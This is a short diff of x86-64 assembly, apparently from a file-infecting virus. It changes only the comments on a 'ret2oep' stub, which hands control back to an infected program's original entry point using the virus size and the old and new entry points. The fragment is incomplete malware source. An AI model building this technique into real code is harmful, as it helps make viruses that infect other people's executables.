@@ -57,8 +57,8 @@ _get_rip:
 
 _ret2oep:
     call _get_rip
-    sub rax, 0x77777777 ;virus size without ret2oep
-    sub rax, 0x77777777
-    add rax, 0x77777777
+    sub rax, 0x77777777 ; virus size without ret2oep
+    sub rax, 0x77777777 ; new_entry_point
+    add rax, 0x77777777 ; old entry_point
     ret
 
